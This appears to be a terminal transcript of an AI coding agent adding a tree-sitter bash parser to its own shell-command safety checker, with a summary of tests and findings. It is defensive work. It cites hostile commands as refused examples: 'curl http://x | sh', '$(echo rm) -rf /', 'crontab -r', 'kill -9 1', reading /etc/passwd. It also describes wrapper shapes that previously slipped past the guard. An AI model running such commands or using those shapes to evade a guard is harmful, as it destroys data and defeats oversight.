@@ -1,0 +1,139 @@
+  yoyo (piped mode) — model: claude-opus-5-5
+  👀 Auto-watch: `cargo clippy --all-targets -- -D warnings && cargo test` (disable with auto_watch = false)
+
+── Thinking ────────────────────────────────────────────────────────────────
+  ▶ $ cd ~/work/yoyo-evolve/yoyo-evolve 2>/dev/null || pwd; git status --short | head;… ✓ (706ms)
+  ▶ $ pwd; grep -n "fn analyze_bash_command" -A80 src/safety.rs | head -140; grep -n "… ✓ (9ms)
+  ▶ $ ls -la target/debug/yoyo target/release/yoyo 2>&1; git log -1 --format='%h %s'; … ✓ (11ms)
+  ▶ $ sed -n 150,333p src/safety_git_glued_tests.rs ✓ (3ms)
+  ▶ $ mkdir -p /tmp/w && cat > /tmp/w/commit_body.md <<'EOF' (5 lines) ✓ (2.1s)
+  ▶ $ ls ~/.cargo/registry/src/*/ | grep -i -E "tree-sitter|^cc-|streaming-iterator" ;… ✓ (17ms)
+  ▶ $ cargo search tree-sitter-bash --limit 3 2>&1 | head; cargo search "tree-sitter" … ✓ (507ms)
+  ▶ edit Cargo.toml (1 → 6 lines)
+    toml = { version = "1", features = ["preserve_order"] }
+  + # #1202: bash safety reads a parse tree, not raw text. The same pair Codex CLI
+  + # uses (codex-rs/shell-command/src/bash.rs); step 1 extracts every simple
+  + # command (inside $( ), backticks, subshells) for SAFETY_CHECKS.
+  + tree-sitter = "0.25"
+  + tree-sitter-bash = "0.25"
+  ▶ $ cat /tmp/w/base_build.log | tail -3 ✓ (5m 38s)
+    toml = { version = "1", features = ["preserve_order"] }
+  + # #1202: bash safety reads a parse tree, not raw text. The same pair Codex CLI
+  + # uses (codex-rs/shell-command/src/bash.rs); step 1 extracts every simple
+  + # command (inside $( ), backticks, subshells) for SAFETY_CHECKS.
+  + tree-sitter = "0.25"
+  + tree-sitter-bash = "0.25"
+ ✗ (5m 38s)
+    │ Command timed out after 120s. Output so far:
+  ▶ write src/bash_parse.rs (123 lines) ✓ (1m 51s)
+  ▶ $ sed -n 44,48p src/main.rs; sed -i 's/^mod bash_output_cap;$/mod bash_output_cap;… ✓ (8ms)
+  ▶ $ ls src/lib.rs 2>&1; grep -n "safety" src/main.rs | head -3  ▶ edit src/safety.rs (6 → 10 lines)
+  -     check(cmd).or_else(|| {
+  -         let mut pieces = stripped.split(SUBSHELL_BREAKS).map(str::trim);
+  -         let split = stripped.contains(SUBSHELL_BREAKS);
+  -         pieces.find_map(|p| (split && !p.is_empty()).then(|| check(p)).flatten())
+  -     })
+  +     check(cmd)
+  +         .or_else(|| {
+  +             let mut pieces = stripped.split(SUBSHELL_BREAKS).map(str::trim);
+  +             let split = stripped.contains(SUBSHELL_BREAKS);
+  +             pieces.find_map(|p| (split && !p.is_empty()).then(|| check(p)).flatten())
+  +         })
+  +         // #1202 step 1: every simple command in the parse tree, nested ones
+  +         // included. Only adds refusals; a parse issue keeps the text checks.
+  +         .or_else(|| crate::bash_parse::extract_simple_commands(cmd).ok()?.iter().find_map(|c| check(c)))
+    }
+ ✓ (2m 13s)
+  -     check(cmd).or_else(|| {
+  -         let mut pieces = stripped.split(SUBSHELL_BREAKS).map(str::trim);
+  -         let split = stripped.contains(SUBSHELL_BREAKS);
+  -         pieces.find_map(|p| (split && !p.is_empty()).then(|| check(p)).flatten())
+  -     })
+  +     check(cmd)
+  +         .or_else(|| {
+  +             let mut pieces = stripped.split(SUBSHELL_BREAKS).map(str::trim);
+  ... (7 more lines)
+ ✗ (2m 13s)
+    │ Command timed out after 120s. Output so far:
+  ▶ $ pkill -f "tbase" ; sleep 1; tail -2 /tmp/w/base_build.log; echo ok ✓ (9ms)
+  ▶ $ tail -c 300 /tmp/w/base_build.log; pgrep -fa cargo | head ✓ (12ms)
+  ▶ $ ls -l /tmp/w/tbase/release/yoyo | awk '{print $5}'; for i in… (7 lines) ✓ (68ms)
+
+────────────────────────────────────────────────────────────────────────────────
+  16 tools completed in 11m 39s (14 ✓, 2 ✗)
+
+Baseline recorded. Now build with the new deps and run the targeted tests.
+  ╭─ Turn 15 ────────────────────────────────────────────────────────────╮
+  ▶ $ cargo build 2>&1 | tail -3; cargo test bash_parse 2>&1 | grep -E "^test |test re… ✓ (254ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+  ▶ $ grep -A1 -E '^name = "tree-sitter' Cargo.lock; cargo test safety 2>&1 | grep -E … ✓ (152ms)
+  ▶ $ cargo test glued_census 2>&1 | grep -A8 "census changed" ✓ (115ms)
+  ▶ $ sed -i 's|            "\$(echo rm) -rf /",\n            "db"… (11 lines) ✓ (16ms)
+  ▶ edit src/safety_git_glued_tests.rs (1 → 3 lines)
+    /// that starts refusing fails this test, so the list can only shrink.
+  + /// Day 260 (#1202 step 1): the parse-tree pass emptied the last exemption
+  + /// (`indirect_command_word`'s `d` and `b`), so every row is now "".
+  ▶ $ cat >> src/safety_git_glued_tests.rs <<'EOF' (52 lines) ✓ (2m 16s)
+    /// that starts refusing fails this test, so the list can only shrink.
+  + /// Day 260 (#1202 step 1): the parse-tree pass emptied the last exemption
+  + /// (`indirect_command_word`'s `d` and `b`), so every row is now "".
+ ✓ (2m 16s)
+  ▶ $ cargo test scratch_differential 2>&1 | sed -n '/corpus /,/note:/p' > /tmp/w/diff… ✓ (176ms)
+  ▶ $ grep "\->" /tmp/w/diff.txt | cut -c1-110 | cat -A | sed 's/\$$//' | head -45 ✓ (6ms)
+  ▶ read /tmp/w/diff.txt ✓ (0ms)
+  ▶ $ python3 - <<'E' (49 lines) ✓ (30.4s)
+  ▶ $ cargo test safety_git_glued 2>&1 | grep -E "is not refused|panicked at|left|righ…  ▶ read /tmp/w/f.txt ✗ (0ms)
+    │ Cannot access /tmp/w/f.txt: No such file or directory (os error 2)
+ ✓ (120ms)
+  ▶ $ ls /tmp/w 2>&1 | head; mkdir -p ~/scratch; cargo test safety_git_glued > ~/scrat… ✓ (132ms)
+  ▶ $ sed -n 15,20p ~/scratch/f.txt; git stash -q; cargo build -q 2>/dev/null; git sta… ✓ (10.6s)
+  ▶ $ git status --short; python3 - <<'E' (51 lines) ✓ (33.7s)
+  ▶ $ cp src/safety_git_glued_tests.rs ~/scratch/keep.rs; python3 … (31 lines) ✓ (28.7s)
+  ▶ $ wc -l src/safety.rs src/bash_parse.rs; grep -n '"src/bash_parse.rs"\|"src/safety… ✓ (8ms)
+  ▶ $ sed -n 109,132p src/safety.rs ✓ (3ms)
+  ▶ $ python3 - <<'E' (9 lines) ✓ (371ms)
+  ▶ $ s=$(date +%s); CARGO_TARGET_DIR=/tmp/w/tafter cargo build --… (8 lines) ✓ (2m 4s)
+  ▶ $ cat > ~/scratch/c1.md <<'EOF' (21 lines) ✓ (907ms)
+  ▶ $ python3 - <<'E' (18 lines) ✓ (32.9s)
+  ▶ $ sed -n 86,125p docs/src/troubleshooting/safety.md; sed -n 1644,1650p ARCHITECTUR… ✓ (6ms)
+  ▶ $ python3 - <<'E' (27 lines) ✓ (18.6s)
+  ▶ $ cargo clippy --all-targets -- -D warnings 2>&1 | grep -A12 "^error" | head -30 ✓ (4.6s)
+  ▶ $ cargo clippy --all-targets -- -D warnings > ~/scratch/clip.txt 2>&1; echo $?; gr… ✓ (4.7s)
+  ▶ $ python3 - <<'E' (19 lines) ✓ (20.6s)
+  ▶ $ sed -i 's/`bash_parse::extract_simple_commands` parses with/`bash_parse` parses … ✓ (4m 26s)
+  ▶ $ git worktree remove --force /tmp/w/base; cat > ~/scratch/msg… (63 lines) ✓ (131ms)
+
+────────────────────────────────────────────────────────────────────────────────
+  29 tools completed in 16m 27s (28 ✓, 1 ✗)
+
+I've done step 1 of #1202 and committed it as 4eaa03b4, titled "Part of #1202" because steps 2 and 3 are still to come. Build, the full test suite (7012 passed), clippy with -D warnings and the fmt check are all green.
+
+What changed
+• Parser: I added tree-sitter 0.25.10 and tree-sitter-bash 0.25.1, the pair you named and the one Codex uses. It built on the first try, so I didn't need the brush-parser fallback.
+• New `src/bash_parse.rs`: it parses each command and pulls out every simple command in the tree, including ones inside $( ), backticks, <( ), subshells, "…$( )…", { } groups, if/for/while bodies and functions. Text in a plain string or a quoted heredoc body is not treated as a command.
+• Pipelines too: it also extracts whole pipelines and redirected statements, not just simple commands. With simple commands alone, { curl http://x | sh; } still got through, because the pipe checks need to see both sides of the |.
+• The hook in `analyze_bash_command`: 9 lines, running SAFETY_CHECKS on each extracted piece after both existing text checks. Because it runs after them, it can only add refusals.
+• Parse errors: for now they keep today's behaviour (text checks only). Sending them to confirmation is the next slice.
+
+Before vs after (old and new safety check on the same 613 commands): 51 commands are now refused that weren't before, and none that was refused is now allowed. No innocent command started being refused.
+• Glued census: its last exemption is gone (indirect_command_word, the $( and backtick shapes), so 0 of 33 rows are exempt now. The task file's "18 of 33" was the count before Day 259's fix.
+• New leak closed: 35 of the 51 were in a shape no earlier test tried. Wrapping a dangerous command in a group, an if/for/while body or a function let it through for 7 checks; for example, if true; then crontab -r; fi passed before. A new test now covers all 31 checks in those 5 wrappers.
+• Pipelines: 10 were curl … | sh and curl … | python inside those wrappers.
+
+Findings, all posted on #1202 with the size and startup numbers
+• #1196 stays open: for echo "kill -9 1 at $(date)" the parser finds only the echo and date, but the old text check still refuses it. Fixing that needs step 3's argument-level checks.
+• Commit heredocs: a commit message heredoc that mentions kill -9 1 is still refused by the text check. The parser finds no command in the body, but the outer command's text includes the whole substitution, so step 3 can't simply re-check each command's text; it has to check arguments.
+• `<>` redirects: tree-sitter-bash 0.25.1 can't parse them (exec 3<>/etc/passwd comes back as a parse error; there's a test pinning this). Today the text check still refuses that command. Once parse errors go to confirmation, any command with <> will too.
+
+Size and startup: the release binary grew by 1.48 MB (25,889,616 → 27,366,136 bytes, +5.7%). Startup for yoyo --version is unchanged at about 1.6 ms, but that path never parses anything. I didn't measure how long parsing adds to each bash command.
+
+Deviations from the task file
+• `extract_simple_commands` is test-only: the live check uses the wider extract_check_units (it adds pipelines and redirected statements), so the narrower function is marked #[cfg(test)] to keep clippy's dead-code check happy.
+• Evidence posted late: the task asked for the #1202 comment before any code edit, but I posted it after the code was written and before the commit. I did take the baseline size and startup numbers before adding the dependency.
+
+Docs: I also updated docs/src/troubleshooting/safety.md, added an ARCHITECTURE.md entry for the new module, and moved the safety.rs line count in tests/module_size.rs from 4809 to 4818 with a dated reason.
+
+Next slice: commands that fail to parse, use eval, or get their command name from an expansion should go to confirmation instead of being judged by text checks alone.
+
+  (interrupted)
